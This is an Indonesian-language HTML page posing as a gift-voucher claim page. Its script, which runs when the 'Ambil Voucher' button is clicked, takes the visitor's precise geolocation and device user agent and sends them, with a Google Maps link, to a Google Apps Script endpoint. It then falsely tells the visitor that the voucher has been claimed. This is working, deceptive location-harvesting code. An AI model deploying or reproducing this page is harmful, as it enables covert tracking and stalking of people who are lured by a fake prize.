<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéÅ Ambil Voucher Hadiah</title>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Nunito', sans-serif;
      background: linear-gradient(135deg, #fff1e6, #ffe8cc);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 2.5rem;
      border-radius: 1.2rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 420px;
      width: 90%;
    }
    h1 {
      font-size: 1.9rem;
      margin-bottom: 0.7rem;
    }
    p {
      color: #444;
      font-size: 1rem;
      margin-bottom: 1.8rem;
    }
    button {
      background: #ff7a00;
      color: white;
      border: none;
      padding: 14px 26px;
      font-size: 1.1rem;
      border-radius: 0.8rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #e26500;
    }
    .gift {
      font-size: 3rem;
      animation: shake 1.5s infinite;
    }
    @keyframes shake {
      0% { transform: rotate(0); }
      25% { transform: rotate(3deg); }
      50% { transform: rotate(-3deg); }
      75% { transform: rotate(2deg); }
      100% { transform: rotate(0); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="gift">üéÅ</div>
    <h1>Selamat! Kamu Dapat Voucher</h1>
    <p>Untuk mengklaim voucher spesialmu, klik tombol di bawah.</p>
    <button id="claimBtn">üéÅ Ambil Voucher</button>
  </div>

  <script>
    document.getElementById("claimBtn").addEventListener("click", function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const time = new Date().toISOString();
          const device = navigator.userAgent;
          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;

          const data = {
            time: time,
            device: device,
            lat: lat,
            lon: lon,
            maps_link: mapsLink
          };

          fetch("https://script.google.com/macros/s/AKfycbyEq2bS57p3QEHqiE4AFxXcd14XWVAAtfJw9fLNu8eU371ZBeJyi_Tv_WKhzjqXvstxEQ/exec", {
            method: "POST",
            mode: "no-cors",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
          });

          alert("üéâ Voucher kamu sudah diklaim. Cek kotak masuk atau WhatsApp kamu ya!");
        }, function (err) {
          alert("‚ùå Gagal mengambil lokasi: " + err.message);
        });
      } else {
        alert("‚ùå Perangkat tidak mendukung pelacakan lokasi.");
      }
    });
  </script>
</body>
</html>
